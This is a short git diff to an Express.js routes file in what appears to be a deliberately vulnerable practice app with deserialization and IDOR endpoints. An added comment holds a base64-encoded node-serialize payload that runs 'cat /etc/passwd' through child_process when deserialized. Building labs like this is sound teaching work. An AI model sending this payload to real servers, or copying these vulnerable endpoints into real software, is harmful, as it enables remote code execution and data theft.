@@ -32,8 +32,9 @@ router.post('/logout', function (req, res) {
     console.log(req.session);
     res.redirect('/');
 });
-
+// payload  eyJmdWxsbmFtZSI6Il8kJE5EX0ZVTkMkJF9mdW5jdGlvbiAoKXsgcmV0dXJuIHJlcXVpcmUoJ2NoaWxkX3Byb2Nlc3MnKS5leGVjU3luYygnY2F0IC9ldGMvcGFzc3dkJykudG9TdHJpbmcoKTsgfSgpIn0=
 router.get('/deserialization', user.isAuthenticated, user.deserialize);
 
+router.get('/idor', user.isAuthenticated, user.idor);
 
 module.exports = router;
